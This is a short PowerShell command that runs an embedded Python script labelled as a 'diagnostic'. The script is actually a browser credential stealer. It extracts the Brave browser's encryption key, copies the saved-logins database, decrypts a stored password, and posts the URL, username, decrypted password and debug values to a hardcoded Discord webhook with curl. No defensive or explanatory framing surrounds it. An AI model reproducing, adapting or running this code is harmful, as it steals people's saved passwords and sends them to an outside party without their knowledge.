cd $env:TEMP\py

.\python.exe -c @"
import sqlite3,os,base64,win32crypt,json
from Crypto.Cipher import AES

def send(m):
    import subprocess
    f=open('msg.json','w')
    f.write('{\"content\":\"'+m.replace('\\','\\\\').replace('\"','\\\"')[:1900]+'\"}')
    f.close()
    subprocess.run(['curl.exe','-X','POST','-H','Content-Type: application/json','-d','@msg.json','https://discord.com/api/webhooks/1467597897435582594/wbqYsXdKoKB124ig5QJCGBBb88kmkTUpEKGEq0A6oZ-81uZ0ecgtHM-D8Zq44U7uh_8W'],shell=True)
    os.remove('msg.json')

send('🔍 Starting diagnostic...')

b=os.path.expandvars(r'%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data')
ld=b+r'\\Default\\Login Data'
ls=b+r'\\Local State'

try:
    with open(ls) as f:
        key=win32crypt.CryptUnprotectData(base64.b64decode(json.load(f)['os_crypt']['encrypted_key'])[5:],None,None,None,0)[1]
    
    send('Key extracted: '+str(len(key))+' bytes')
    
    import shutil
    shutil.copy2(ld,'t.db')
    
    c=sqlite3.connect('t.db')
    r=c.execute('SELECT origin_url,username_value,password_value FROM logins WHERE username_value!=\"\" LIMIT 1').fetchone()
    
    if r:
        send('URL: '+r[0])
        send('Username: '+r[1])
        send('Encrypted: '+str(len(r[2]))+' bytes')
        send('Prefix hex: '+r[2][:3].hex())
        send('First 100 hex: '+r[2][:100].hex())
        
        nonce=r[2][3:15]
        tag=r[2][-16:]
        cipher_text=r[2][15:-16]
        
        send('Nonce: '+nonce.hex())
        send('Tag: '+tag.hex())
        
        try:
            aes=AES.new(key,AES.MODE_GCM,nonce=nonce)
            pwd=aes.decrypt_and_verify(cipher_text,tag)
            send('DECRYPTED: '+str(pwd))
            send('UTF-8: '+pwd.decode('utf-8',errors='ignore'))
        except Exception as e:
            send('Decryption error: '+str(e))
    else:
        send('No passwords found')
    
    c.close()
    os.remove('t.db')
    
except Exception as e:
    send('ERROR: '+str(e))

send('Diagnostic complete')
"@
